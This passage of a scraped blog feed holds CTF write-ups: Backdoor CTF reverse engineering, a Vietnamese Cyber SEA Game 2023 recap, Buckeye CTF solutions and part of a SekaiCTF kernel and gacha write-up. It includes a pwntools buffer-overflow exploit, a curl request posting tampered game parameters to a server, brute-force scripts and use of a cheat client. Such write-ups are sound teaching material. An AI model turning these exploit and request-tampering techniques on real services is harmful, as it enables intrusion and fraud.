_JNIEnv::GetStringUTFChars(a1, a3, 0); std::string::basic_string\u0026lt;decltype(nullptr)\u0026gt;(v13, StringUTFChars); _JNIEnv::ReleaseStringUTFChars(a1, a3, StringUTFChars); sub_1B850(v12); sub_1B8A0(v11); while ( (sub_1B910(v12, v11) \u0026amp; 1) != 0 ) { v3 = sub_1B950(v12); *v3 += 8; *v3 ^= 7u; sub_1B960(v12); } v4 = sub_1BCB0(v13); v6 = _JNIEnv::NewStringUTF(a1, v4); _JNIEnv::CallVoidMethod(a1, a2, MethodID, v6); _JNIEnv::DeleteLocalRef(a1, v6); std::string::~string(v13); std::string::~string(v14); return __readgsdword(0x14u); } Here is simple encrypt with +8 and ^7 so i use script:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 def encrypt_string(input_str, key): result = bytearray() for i in range(len(key)): encrypted_char = (ord(key[i]) + 8) ^ 7 result += encrypted_char.to_bytes(1, byteorder=\u0026#34;little\u0026#34;) return result k1 = \u0026#34;Yc^XtMfu\u0026#34; m1 = \u0026#34;d23ba52679c5e1\u0026#34; encrypted_result = encrypt_string(m1, k1) print(\u0026#34;Encrypted Result:\u0026#34;, encrypted_result.hex()) # 666c61677b52697a --\u0026gt; flag{Riz 2. Java_com_backdoor_sl4ydroid_MainActivity_damn\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 unsigned int __cdecl Java_com_backdoor_sl4ydroid_MainActivity_damn(_JNIEnv *a1, int a2, int a3) { int v3; // eax const char *v4; // eax char v6; // [esp+27h] [ebp-71h] int v7; // [esp+38h] [ebp-60h] int i; // [esp+3Ch] [ebp-5Ch] int StringUTFChars; // [esp+40h] [ebp-58h] int MethodID; // [esp+4Ch] [ebp-4Ch] int v11; // [esp+50h] [ebp-48h] int ObjectClass; // [esp+54h] [ebp-44h] char v13[16]; // [esp+58h] [ebp-40h] BYREF char v14[16]; // [esp+68h] [ebp-30h] BYREF char v15[16]; // [esp+78h] [ebp-20h] BYREF unsigned int v16; // [esp+88h] [ebp-10h] v16 = __readgsdword(0x14u); ObjectClass = _JNIEnv::GetObjectClass(a1, a2); ring(v15, \u0026amp;r1, \u0026amp;us3_m3); v11 = sub_1BCB0(v15); MethodID = _JNIEnv::GetMethodID(a1, ObjectClass, v11, \u0026#34;(Ljava/lang/String;)V\u0026#34;); StringUTFChars = _JNIEnv::GetStringUTFChars(a1, a3, 0); std::string::basic_string\u0026lt;decltype(nullptr)\u0026gt;(v14, StringUTFChars); _JNIEnv::ReleaseStringUTFChars(a1, a3, StringUTFChars); std::string::basic_string(v13, v14); for ( i = sub_1AC20(v13) - 1; i \u0026gt;= 0; --i ) { v6 = *sub_1AC50(v13, i) ^ 0xC; v3 = sub_1AC20(v14); *sub_1AC50(v14, v3 - 1 - i) = v6; } v4 = sub_1BCB0(v14); v7 = _JNIEnv::NewStringUTF(a1, v4); _JNIEnv::CallVoidMethod(a1, a2, MethodID, v7); _JNIEnv::DeleteLocalRef(a1, v7); std::string::~string(v13); std::string::~string(v14); std::string::~string(v15); return __readgsdword(0x14u); } Here is simple xor with 0xC and reverse strings\n1 2 3 4 5 6 7 8 9 10 11 12 def damn(k3): v14 = k3 for i in range(len(k3)-1, -1, -1): v6 = ord(k3[i]) ^ 0xC v14 = v14[:len(k3)-1-i] + chr(v6) + v14[len(k3)-1-i+1:] return v14 k3 = \u0026#34;~?z?^S8o\u0026#34; result = damn(k3) print(result) # c4_R3v3r 3. Java_com_backdoor_sl4ydroid_MainActivity_k2\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 unsigned int __cdecl Java_com_backdoor_sl4ydroid_MainActivity_k2(_JNIEnv *a1, int a2, int a3) { unsigned int v3; // eax const char *v4; // eax char v6; // [esp+1Ch] [ebp-6Ch] char v7; // [esp+23h] [ebp-65h] int v8; // [esp+38h] [ebp-50h] unsigned int i; // [esp+3Ch] [ebp-4Ch] int StringUTFChars; // [esp+40h] [ebp-48h] int MethodID; // [esp+4Ch] [ebp-3Ch] int v12; // [esp+50h] [ebp-38h] int ObjectClass; // [esp+54h] [ebp-34h] char v14[16]; // [esp+58h] [ebp-30h] BYREF char v15[16]; // [esp+68h] [ebp-20h] BYREF unsigned int v16; // [esp+78h] [ebp-10h] v16 = __readgsdword(0x14u); ObjectClass = _JNIEnv::GetObjectClass(a1, a2); ring(v15, \u0026amp;r2, \u0026amp;us3_m3); v12 = sub_1BCB0(v15); MethodID = _JNIEnv::GetMethodID(a1, ObjectClass, v12, \u0026#34;(Ljava/lang/String;)V\u0026#34;); StringUTFChars = _JNIEnv::GetStringUTFChars(a1, a3, 0); std::string::basic_string\u0026lt;decltype(nullptr)\u0026gt;(v14, StringUTFChars); _JNIEnv::ReleaseStringUTFChars(a1, a3, StringUTFChars); for ( i = 0; i \u0026lt;= sub_1AC20(v14) - 1; ++i ) { v6 = *sub_1AC50(v14, i); v3 = sub_1AC20(\u0026amp;v2); v7 = *sub_1AC50(\u0026amp;v2, i % v3) ^ v6; *sub_1AC50(v14, i) = v7; } v4 = sub_1BCB0(v14); v8 = _JNIEnv::NewStringUTF(a1, v4); _JNIEnv::CallVoidMethod(a1, a2, MethodID, v8); _JNIEnv::DeleteLocalRef(a1, v8); std::string::~string(v14); std::string::~string(v15); return __readgsdword(0x14u); } Here use RC4 with %v2 corresponds to m2\n1 2 3 4 5 6 7 8 9 10 11 k4 = \u0026#34;xP78V`m?3XeL\u0026#34; r = b\u0026#34;\u0026#34; m2 = \u0026#34;May_1??\u0026#34; for i in range(len(k4)): ra = ord(m2[i % len(m2)]) ^ ord(k4[i]) r += ra.to_bytes(2, byteorder=\u0026#34;little\u0026#34;) print(r.replace(b\u0026#34;\\x00\u0026#34;,b\u0026#34;\u0026#34;)) # b\u0026#39;51Ngg_RrR!:}\u0026#39; I receive flag{Riz....c4_R3v3r51Ngg_RrR!:} and stuck with ring function in Java_com_backdoor_sl4ydroid_MainActivity_nim.\nWe can use gdb to debug this function \u0026amp; get script\n1 2 3 4 5 6 7 8 9 x = \u0026#34;yeahh\u0026#34; k2 = \u0026#34;0,S[)\u0026#34; flag2 = \u0026#34;\u0026#34; for i in range(len(k2)): flag2+= chr(ord(x[i]) ^ (ord(k2[i]) ^ 0x13)) print(flag2) # ZZ! R flag: flag{RizZZ! Rc4_R3v3r51Ngg_RrR!:}\nIt\u0026rsquo;s a pity because this challenge is\u0026rsquo;t hard hix :((. We can use log in Android Studio to check flag easily xDDD (From Vietzett)\n","date":"2023-12-18T00:00:00Z","image":"/p/backdoor-ctf-2023-reverse-engineering/featured_hu1633d773772b68a8a46d663a367faa24_195597_120x120_fill_box_smart1_3.png","permalink":"/p/backdoor-ctf-2023-reverse-engineering/","title":"Backdoor CTF 2023 | Reverse Engineering"},{"content":"Post này chỉ để kể câu chuyện đội mình đi thi Cyber SEA Game 2023 tại Bangkok, Thailand (9-10/11/2023)\nCyber SEA Game 2023 (Bangkok - Thailand) Tổng quan về cuộc thi của đội Việt Nam Trong 5 phút đầu tiên, khi team Việt Nam nhận server và tài khoản cũng như thực hiện các thao tác về đổi mật khẩu và kiểm tra, chúng tôi ngạc nhiên khi thấy có tới 6 team khác đã lần lượt submit các chủ đề, nhưng chưa rõ điều gì đã xảy ra.\nCác thành viên trong đội tự quản lý khối lượng công việc một cách rõ ràng, mặc dù hơi tiếc rằng Huy và Thành, chuyên sâu về Binary và Web Exploitation, lại không có chủ đề nào liên quan đến sở trường của họ. Cụ thể:\nViệt Anh đảm nhận Cryptography và Network Hoàng Huy chịu trách nhiệm cho Hacking Challenge 1 Thái Sơn thực hiện các nhiệm vụ OSINT, Steganography, Forensic, Reversing, và Memory Chí Thành đảm nhiệm Hacking Challenge 2. Chúng tôi cảm thấy áp lực khi đội Singapore thực hiện nhanh chóng và hoàn thành trong thời gian ngắn. Tuy nhiên, RobinHust không nản chí và cố gắng hết mình để hoàn thành các thách thức của mình. Đặc biệt, các thách thức không chỉ đòi hỏi sử dụng các kỹ thuật tấn công cơ bản mà còn đòi hỏi sự sáng tạo và \u0026ldquo;cảm nhận từ giác quan\u0026rdquo; (hay còn gọi 1 cách khác là bruteforce :3):\nTrong bài Flag #03: Cracking a Zip File của chủ đề Cryptography, có một yêu cầu là phải giải mã mật khẩu openthesamesenovemberXXXX, và việc bruteforce 4 ký tự cuối có thể mất một khoảng thời gian (theo lời giải chính thức đến từ BTC). Tuy nhiên, thông qua khả năng suy luận, chúng tôi đã thử nghiệm thành công với 4 ký tự cuối là 2023, giúp quá trình trở nên nhanh chóng và dễ dàng\nHoàng Huy tấn công thành công Hacking Challenge 1, liên tục vượt qua các thách thức. Team Việt Nam đã thể hiện khả năng xuất sắc trong việc giải quyết thử thách này nhờ đọc kỹ tài liệu từ BTC và thử nghiệm trước.\nThái Sơn đã xử lý thành công các thử thách về Steganography, Memory, Reversing và mở các thử thách Forensic.\nThành đã chuyển sang hỗ trợ Sơn và Việt Anh trong các thử thách Forensic và Crypto, sau đó quay trở lại cùng Hoàng Huy để giải quyết Hacking Challenge 2.\nMọi thứ diễn ra mượt mà và suôn sẻ, đội đã hoàn thành toàn bộ các thách thức trong vòng 3 tiếng 30 phút.\nTrong cuộc thi, hầu hết các đội đều có tỉ lệ submit sai khá lớn cùng 1 lượng thời gian lãng phí quá nhiều vì phải đoán trong thử thách Flag #03 Initial execution của chủ đề điều tra số Forensic đưa ra 1 danh sách khá nhiều những flag giả mà chúng tôi phải thử để giải quyết\nPhase 1: khởi đầu của cuộc thi (Khoảng 1 tiếng từ sau khi cuộc thi bắt đầu) Đội của chúng tôi khởi đầu không mấy thuận lợi khi trở thành đội chậm nhất trong số 10 đội giải quyết thử thách đầu tiên.\nCác đội khác bắt đầu submit từng thử thách từ 12:00 và đến tận 12:22 team Việt Nam mới submit được challenge đầu của Việt Anh (Thật sự khâm phục các thành viên trong đội vì giữ được sự bình tĩnh đến không ngờ)\nSau đó các thành viên lần lượt submit các bài đầu tiên của từng chủ đề (tới lúc này vẫn giữ vị trí cuối bảng do các đội khác đã submit rất nhiều các thử thách khác từ trước đó một lúc)\nPhase 2: mid game (Khoảng 2 tiếng từ sau khi cuộc thi bắt đầu) Sau khi bị mắc kẹt ở những thử thách ban đầu, đội của chúng tôi đã khôi phục được phong độ và thành công trong việc giải quyết các thách thức tiếp theo một cách nhanh chóng.\nBứt tốc lần 1: sau khoảng 30 phút kể từ khi giải được challenge đầu tiên, team đã bứt tốc từ vị trí cuối bảng lên vị trí 6, bị dẫn trước bởi các team Singapore, Malaysia, Thái, Brunei và Myanmar\nSau hơn một giờ diễn ra cuộc thi, đội Singapore đã gây ấn tượng khi hoàn thành tất cả các thử thách, kèm theo việc lắc chuông mỗi khi \u0026ldquo;clear\u0026rdquo; một chủ đề nào đó. Lúc này, tâm lý của đội chúng tôi có chút \u0026ldquo;sốc\u0026rdquo;, nhưng đã nhanh chóng ổn định tinh thần và tiếp tục vượt qua mọi thách thức.\nBứt tốc lần 2: Khoảng 1 giờ 45 phút đến 2 giờ sau khi cuộc thi bắt đầu, đội của chúng tôi liên tục giải quyết các thử thách về Crypto, Hacking Challenge 1 và Forensic. Việc này giúp đội chúng tôi vượt qua đội Thái Lan, đồng thời chiếm top 3 trên Bảng xếp hạng, chỉ đứng sau đội Singapore và Malaysia.\nPhase 3: End game Bứt tốc lần 3: Sau một thời gian dài bế tắc ở các thách thức Forensic và Hacking Challenge 2 bởi độ guessing của chúng, bằng thiên phú \u0026ldquo;bruteforce\u0026rdquo; của các thành viên, đội của chúng tôi cuối cùng cũng vượt qua khó khăn, giải quyết một lượt toàn bộ các thử thách Forensic (tới lúc này Thái Sơn gần như đã thuộc toàn bộ source của 7 thử thách Forensic vì luẩn quẩn ở đây quá lâu 🤣)\nChốt hạ Cyber SEA Game 2023 với Việt Nam là thử thách cuối của Hacking Challenge 2 bằng cú submit của Hoàng Huy. Điều này giúp chúng tôi vượt qua đội Malaysia, trở thành đội thứ hai giải toàn bộ các thử thách, sau gần 4 tiếng đồng hồ.\nP/s: Sau đó khoảng 1 tiếng thì đội thứ 3 là Team Thailand cũng hoàn thành toàn bộ thử thách và BTC đã có thể định ra 3 đội trao Nhất, Nhì, Ba của toàn giải Cyber SEA Game.\nBảng xếp hạng Trao Giải Tuy có chút tiếc nuối về việc không đạt được chiếc cúp vô địch của Cyber SEA Game nhưng Nu_RobinHust cũng rút ra được bài học rất lớn về việc chuẩn bị kỹ càng mọi thứ trước khi tham gia 1 cuộc thi cũng như sự bình tĩnh khi gặp các khó khăn đột ngột.\nĐây sẽ là bước tiến rất lớn cho team cũng như Đại học Bách khoa Hà Nội, chúng mình cũng sẽ lấy đó làm kinh nghiệm và động lực để phát triển bản thân mình trong tương lai.\n","date":"2023-11-10T00:00:00Z","image":"/p/cyber-sea-game-2023-recap/featured_hu59a906ccfb75fefec7be147e7f623c55_262995_120x120_fill_box_smart1_3.png","permalink":"/p/cyber-sea-game-2023-recap/","title":"Cyber SEA Game 2023 | Recap"},{"content":"Here is writeups for some challs that i solved in this competition!\nCurrency Converter | REV attachment: converter.jar\nNeed to convert USD to another currency? Well I hope its either Euros, Canadian, or Yen!\nReceive attachment include 1 jar file, so use Decompiler - Jar String Editor decompile jar to java\nIn the CurrencyConverter.java we get the flag\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public class CurrencyConverter { public static String convert_euro(double var0) { double var2 = var0 * 0.92D; return \u0026#34;Euro: \u0026#34; + var2; } public static String convert_canada(double var0) { double var2 = var0 * 1.36D; return \u0026#34;Canadian: \u0026#34; + var2; } public static String convert_yen(double var0) { double var2 = var0 * 145.14D; return \u0026#34;Japanese Yen: \u0026#34; + var2; } private static String flag() { return \u0026#34;bctf{o0ps_y0u_fOuNd_mE}\u0026#34;; } } 8ball | REV Attachment: dist.zip\nLet me guide you to the flag.\nWhen extract file, i receive an elf file (8ball)\nthen load it into IDA, and follow the main part\nand function print_flag() (but we can skip it bcuz it seem difficult)\nIn main, we have: if ( argc != 2 ), !strcmp(*argv, \u0026quot;./magic8ball\u0026quot;) and if ( v8 \u0026amp;\u0026amp; strstr(argv[1], \u0026quot;flag\u0026quot;) ) so i think i must rename the file (8ball to magic8ball) and argument is flag\nBeginner Menu | PWN attachment: beginner-menu.c\nI just made this menu for my coding class. I think I covered all the switch cases.\nnetcat: nc chall.pwnoh.io 13371\nIn this chall, we can see the game with guess number (each netcat connection)\nbut if we guess the correct number, the netcat will disconnect :((\n1 2 3 4 5 6 7 8 9 10 11 12 13 else if(atoi(buf) ==3){ while(num!=atoi(guess)){ printf(\u0026#34;Guess the number I\u0026#39;m thinking of: \u0026#34;); fgets(guess, 50, stdin); if(atoi(guess)\u0026lt;num){ printf(\u0026#34;Guess higher!\\n\u0026#34;); } else if(atoi(guess)\u0026gt;num){ printf(\u0026#34;Guess lower!\\n\u0026#34;); } } exit(0); // exit when guess the correct number } print_flag() will be called if pass all if-else\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 if(strcmp(buf, \u0026#34;0\\n\u0026#34;)==0){ printf(\u0026#34;That\u0026#39;s not an option\\n\u0026#34;); exit(0); } if(atoi(buf) ==1){ printf(joke[(rand()%5)]); exit(0); } else if(atoi(buf) == 2){ printf(weather[(rand()%5)]); exit(0); } else if(atoi(buf) ==3){ while(num!=atoi(guess)){ printf(\u0026#34;Guess the number I\u0026#39;m thinking of: \u0026#34;); fgets(guess, 50, stdin); if(atoi(guess)\u0026lt;num){ printf(\u0026#34;Guess higher!\\n\u0026#34;); } else if(atoi(guess)\u0026gt;num){ printf(\u0026#34;Guess lower!\\n\u0026#34;); } } exit(0); } else if(atoi(buf)==4){ exit(0); } else if(atoi(buf)\u0026gt;4){ printf(\u0026#34;That\u0026#39;s not an option\\n\u0026#34;); exit(0); } print_flag(); but i found vuln :\u0026gt;\nso we can press Enter into the select option of netcat to get flag\nStarter Buffer | PWN attachment: start-buffer.c\nTell me your favorite number and I might give you the flag ;).\nnetcat: nc chall.pwnoh.io 13372\nI see the buffer overflow vulnerability here\nso we can use pwntool to send byte 0x45454545 through netcat and string buffer and get the flag (The current value of the flag is 0xaabbccdd, so we must input 60 * \u0026quot;A\u0026quot; + byte 0x45454545 so that the value after input of the flag becomes 0x45454545)\n1 2 3 4 5 6 7 8 from pwn import * p = remote(\u0026#34;chall.pwnoh.io\u0026#34;, 13372) exploit_payload = b\u0026#34;A\u0026#34; * 60 + p32(0x45454545) p.sendline(exploit_payload) response = p.recvall() print(response) Needle in the Wifi Stack | MISC attachment: frames.pcap\nThis chall has a .pcap file, as usual, i\u0026rsquo;ll strings + grep first and it has many base64 strings\nso i think we can find with the format of flag: btcf{ encode to base64: YmN0Zn\nConvert YmN0Znt0dzBfcG8xbnRfNF9nMzNfYzBuZzNzN2kwbn0K0 to base64\nParkour | MISC (ftpotato) Completely unrelated to CTF Minecraft parkour.\nserver: chall.pwnoh.io:13389\nThis challenge is a minecraft parkour server created by the author in version 1.20.1\nAfter many unsuccessful attempts to jump on the blocks, i decided to cheat :333 and i use Wurst Client\nAfter cheating with the Wurst Client, you can fly to the flag in the sky and get it\nMy First Hash | CRYPTO Here\u0026rsquo;s your flag: 8f163b472e2164f66a5cd751098783f9 Psyc! Its encrypted. You think I\u0026rsquo;d give it to you that easily? Definitely don\u0026rsquo;t look at my code tho -\u0026gt;\u0026lt;- (when you find the flag, put it in bctf{} format)\nattachment: my-first-hash.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import hashlib from sys import exit flag = \u0026#39;8f163b472e2164f66a5cd751098783f9\u0026#39; str = input(\u0026#34;Enter the flag\\n\u0026#34;) str = hashlib.md5(str.encode()) if str.digest().hex() == flag: print(\u0026#34;Congrats! You got the flag!\u0026#34;) else: print(\u0026#34;Nope. Try again!\u0026#34;) exit() it seems like an easy md5 reverse, use MD5 Center to reverse this MD5 hash, we get orchestra \u0026ndash;\u0026gt; bctf{orchestra}\nRivest-Shamir-Adleman | CRYPTO Big numbers make big security\nattachment: dist.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 message = b\u0026#34;[REDACTED]\u0026#34; m = int.from_bytes(message, \u0026#34;big\u0026#34;) p = 3782335750369249076873452958462875461053 q = 9038904185905897571450655864282572131579 e = 65537 n = p * q et = (p - 1) * (q - 1) d = pow(e, -1, et) c = pow(m, e, n) print(f\u0026#34;e = {e}\u0026#34;) print(f\u0026#34;n = {n}\u0026#34;) print(f\u0026#34;c = {c}\u0026#34;) # OUTPUT: # e = 65537 # n = 34188170446514129546929337540073894418598952490293570690399076531159358605892687 # c = 414434392594516328988574008345806048885100152020577370739169085961419826266692 this is an easy RSA (basic), we have both p, q, n, c, e so we can write script to solve:\n1 2 3 4 5 6 7 8 9 10 11 p = 3782335750369249076873452958462875461053 q = 9038904185905897571450655864282572131579 e = 65537 c = 414434392594516328988574008345806048885100152020577370739169085961419826266692 n = p * q phi = (p - 1) * (q - 1) d = pow(e, -1, phi) m = pow(c, d, n) print(m.to_bytes((m.bit_length() + 7) // 8, \u0026#34;big\u0026#34;)) Secret Code | CRYPTO Here\u0026rsquo;s your flag again: 1:10:d0:10:42:41:34:20:b5:40:03:30:91:c5:e1:e3:d2:a2:72:d1:61:d0:10:e3:a0:43:c1:01:10:b1:b1:b0:b1:40:9 LOL you snub_wrestle. Good luck trying to undo my xor key I used on each character of the flag.\nI think this is easy chall about xor\nFirst, we must remove : from the encryp, it gives us: 110d01042413420b540033091c5e1e3d2a272d161d010e3a043c10110b1b1b0b1409, then convert from hex to byte \u0026amp; xor with snub_wrestle to get flag\n","date":"2023-10-02T00:00:00Z","image":"/p/buckeye-ctf-2023-writeups/featured-image_hu5fad3dab004c0aa4880db40f68baffb0_36302_120x120_fill_box_smart1_3.png","permalink":"/p/buckeye-ctf-2023-writeups/","title":"Buckeye CTF 2023 | Writeups"},{"content":"Unfortunately, during the tournament, I was tricked into debugging the Teyvat Travel Guide challenge, which led me to go the wrong way and give up while making myself feel like I had no hope (when it was really only at medium level):\u0026lt; and lost. Quite a bit of effort for the Guardians of the Kernel challenge\nAzusawa’s Gacha World Author: enscribe\n❖ Note The website only contains the challenge description, and is not needed to solve the challenge.\nChallenge structure analysis In the first challenge, I received a full folder of Sekai\u0026rsquo;s Gacha game (Created by Unity)\nWhile searching through folders, I found a file named Assembly-CSharp.dll\nKnowing it was related to Csharp, I loaded it into DnSpy to get started. Luckily, this file is not too complicated, the information is clear.\n1. Character\n2. GachaRequest\n3. GachaResponse\nReading these 3 classes, I concluded that when I gacha, I will send the parameters in GachaRequest including crystals, pulls and numPulls to the server and receive GachaResponse containing the class character and which includes flag\nWhere does the server receive requests? 4. CreateGachaWebRequest\n1 2 3 4 5 6 7 8 9 10 11 12 13 // GachaManager // Token: 0x06000016 RID: 22 RVA: 0x0000259C File Offset: 0x0000079C private UnityWebRequest CreateGachaWebRequest(string json) { byte[] bytes = Encoding.UTF8.GetBytes(json); string s = \u0026#34;aHR0cDovLzE3Mi44Ni42NC44OTozMDAwL2dhY2hh\u0026#34;; UnityWebRequest unityWebRequest = new UnityWebRequest(Encoding.UTF8.GetString(Convert.FromBase64String(s)), \u0026#34;POST\u0026#34;); unityWebRequest.uploadHandler = new UploadHandlerRaw(bytes); unityWebRequest.downloadHandler = new DownloadHandlerBuffer(); unityWebRequest.SetRequestHeader(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/json\u0026#34;); unityWebRequest.SetRequestHeader(\u0026#34;User-Agent\u0026#34;, \u0026#34;SekaiCTF\u0026#34;); return unityWebRequest; } aHR0cDovLzE3Mi44Ni42NC44OTozMDAwL2dhY2hh là mã hoá base64 của http://172.86.64.89:3000/gacha\nYah, so I have found a server + some payload setup, here I can solve it with burpsuite or send it via shell :\u0026raquo;, I choose via shell for convenience\nP/s: There is also an option for game-style challs like this: Cheat Engine is quite simple, it can determine the exact address of the objects and modify them (in this writeup I will not mention it because it is not pure REV)\nGacha time So, based on what I analyze, I can write a shell curl to retrieve data like I\u0026rsquo;m gacha with the example parameters being 1000, 1, 1. (ie I have 1000 diamonds, new spin 1 time and spin 1 more time)\n1 curl -s -X POST http://172.86.64.89:3000/gacha -d \u0026#39;{\u0026#34;crystals\u0026#34;:1,\u0026#34;pulls\u0026#34;:1,\u0026#34;numPulls\u0026#34;:1}\u0026#39; -H \u0026#39;Content-type: application/json\u0026#39; -H \u0026#39;User-Agent: SekaiCTF\u0026#39; | jq . Maybe I still need to open the game to check what the parameters are\nYah, here it is, the chance of winning gacha is 0% and can only be received when spinning 1 million times :)). So it\u0026rsquo;s simple, because the number of spins per request is only between 1 and 10, so setup pulls will be 999999 and numPulls will be 1, and crystals will be set to 1000.\nPut the jumbled part into cyberchef with base64 and convert it to an image\nflag: SEKAI{D0N7_73LL_53G4_1_C0P13D_7H31R_G4M3}\nGuardians of the Kernel Author: Iyed\n❖ Note It’s just a warmup but with another layer which is the kernel.\nChallenge analysis In this chall, I received an attachment consisting of 2 quite strange files\nAfter researching, I understand that bzImage is a kernel image file that loads and initializes the kernel while booting the system and the .cpio file is like a file system restorer (because it manages data structures and file lists)\nSo I can completely build the kernel image (here I can use qemu), but this build chall is a bit redundant (I don\u0026rsquo;t need debug).\nWe an easily run this kernel with the command:\n1 qemu-system-x86_64 -kernel bzImage -initrd initramfs.cpio -nographic -monitor none -no-reboot -append \u0026#34;console=ttyS0\u0026#34; Instead, I decompress the files in initramfs.cpio with the command: cpio -idv -F inittramfs.cpio\nNotice that there is a file flag_checker.ko (this file contains information about loading modules into the kernel), so maybe I won\u0026rsquo;t need to debug through the kernel anymore, I\u0026rsquo;ll just load it into IDA\nGreat, there is device_ioctl that handles I/O Control, so I exploited this part and bonus\nThe main stream\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 __int64 __fastcall device_ioctl(__int64 a1, int a2, __int64 a3) { __int64 result; // rax unsigned __int8 *v6; // rax int v7; // edx int v8; // eax unsigned int v9; // eax __int64 v10; // rdx if ( a2 == 28673 ) { if ( !layers[1] ) return 0LL; if ( !copy_from_user(buffer, a3, 7LL) ) { buffer[7] = 0; v6 = buffer; while ( (unsigned __int8)(*v6 - 48) \u0026lt;= 9u ) { if ( \u0026amp;buffer[7] == ++v6 ) { v7 = 7 * __ROL4__(1507359807 * __ROR4__(422871738 * *(_DWORD *)buffer, 15), 11); v8 = __ROR4__(422871738 * ((buffer[5] \u0026lt;\u0026lt; 8) ^ (buffer[6] \u0026lt;\u0026lt; 16) ^ buffer[4]), 15); v9 = 1984242169 * ((v7 + 1204333666) ^ (1507359807 * v8) ^ 7 ^ (((v7 + 1204333666) ^ (unsigned int)(1507359807 * v8)) \u0026gt;\u0026gt; 16)); if ( (((-1817436554 * ((v9 \u0026gt;\u0026gt; 13) ^ v9)) \u0026gt;\u0026gt; 16) ^ (-1817436554 * ((v9 \u0026gt;\u0026gt; 13) ^ v9))) != 261736481 ) return 0LL; return device_ioctl_cold(); } } return 0LL; } return -14LL; } if ( a2 == 28674 ) { if ( !layers[2] ) return 0LL; v10 = copy_from_user(buffer, a3, 12LL); if ( !v10 ) { do { buffer[v10] += buffer[v10 + 1] * ~(_BYTE)v10; ++v10; } while ( v10 != 12 ); if ( *(_QWORD *)buffer != 0x788C88B91D88AF0ELL || *(_DWORD *)\u0026amp;buffer[8] != 2113081836 || buffer[12] ) return 0LL; printk(\u0026amp;unk_2EB, a3); return 1LL; } return -14LL; } if ( a2 != 28672 ) { printk(\u0026amp;unk_302, a3); return 0LL; } if ( copy_from_user(buffer, a3, 6LL) ) return -14LL; if ( *(_DWORD *)buffer != 1095451987 || *(_WORD *)\u0026amp;buffer[4] != 31561 ) return 0LL; printk(\u0026amp;unk_2B6, a3); result = 1LL; layers[1] = 1; return result; } As in the text view, we can see that the format of the flag is SEKAI{, then that is the end of the stream \u0026lt;\u0026ndash; Change the value from dec to char for clearer display\n1 if ( *(_DWORD *)buffer != \u0026#39;AKES\u0026#39; || *(_WORD *)\u0026amp;buffer[4] != \u0026#39;{I\u0026#39; ) Processing layer 1 Maybe this is the part that takes up all my time during the tournament :)))), being lazy should be punished by God :(\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 if ( !copy_from_user(buffer, a3, 7LL) ) { buffer[7] = 0; v6 = buffer; while ( (unsigned __int8)(*v6 - 48) \u0026lt;= 9u ) { if ( \u0026amp;buffer[7] == ++v6 ) { v7 = 7 * __ROL4__(1507359807 * __ROR4__(422871738 * *(_DWORD *)buffer, 15), 11); v8 = __ROR4__(422871738 * ((buffer[5] \u0026lt;\u0026lt; 8) ^ (buffer[6] \u0026lt;\u0026lt; 16) ^ buffer[4]), 15); v9 = 1984242169 * ((v7 + 1204333666) ^ (1507359807 * v8) ^ 7 ^ (((v7 + 1204333666) ^ (unsigned int)(1507359807 * v8)) \u0026gt;\u0026gt; 16)); if ( (((-1817436554 * ((v9 \u0026gt;\u0026gt; 13) ^ v9)) \u0026gt;\u0026gt; 16) ^ (-1817436554 * ((v9 \u0026gt;\u0026gt; 13) ^ v9))) != 261736481 ) return 0LL; return device_ioctl_cold(); } } return 0LL; } After writing a lot of failed solutions using rev, I switched to bruteforce.\nIt can be seen that layer 1 contains 7 chars, the algorithm is a bit complicated (and still confused between signed and unsigned type), so I will bruteforce this quickly (actually, while thinking about how to write bruteforce, I can finish the third rev challenge 🐧)\nscript bruteforce:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 def __ROL4__(val, bits, bit_size=32): return (val \u0026lt;\u0026lt; bits % bit_size) \u0026amp; (2 ** bit_size - 1) | ((val \u0026amp; (2 ** bit_size - 1)) \u0026gt;\u0026gt; (bit_size - (bits % bit_size))) def __ROR4__(val, bits, bit_size=32): return ((val \u0026amp; (2 ** bit_size - 1)) \u0026gt;\u0026gt; bits % bit_size) | (val \u0026lt;\u0026lt; (bit_size - (bits % bit_size)) \u0026amp; (2 ** bit_size - 1)) for i in range(10000000): f = str(i).rjust(7, \u0026#39;0\u0026#39;).encode() tmp = (f[3] \u0026lt;\u0026lt; 24) | (f[2] \u0026lt;\u0026lt; 16) | (f[1] \u0026lt;\u0026lt; 8) | f[0] v7 = 7 * __ROL4__(1507359807 * __ROR4__(422871738 * tmp, 15), 11) v8 = __ROR4__(422871738 * ((f[5] \u0026lt;\u0026lt; 8) ^ (f[6] \u0026lt;\u0026lt; 16) ^ f[4]), 15) v9 = 1984242169 * (((v7 + 0x47C8AC62) \u0026amp; 0xFFFFFFFF) ^ ((1507359807 * v8) \u0026amp; 0xFFFFFFFF) ^ 7 ^ ((((v7 + 0x47C8AC62) \u0026amp; 0xFFFFFFFF) ^ ((1507359807 * v8) \u0026amp; 0xFFFFFFFF)) \u0026gt;\u0026gt; 16)) v9 \u0026amp;= 0xFFFFFFFF if ((((2477530742 * ((v9 \u0026gt;\u0026gt; 13) ^ v9)) \u0026amp; 0xFFFFFFFF) \u0026gt;\u0026gt; 16) ^ ((2477530742 * ((v9 \u0026gt;\u0026gt; 13) ^ v9)) \u0026amp; 0xFFFFFFFF)) == 261736481: print(f) \u0026ndash;\u0026gt; 6001337\nThe solution other with z3 makes me bitter\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from z3 import * buffer = 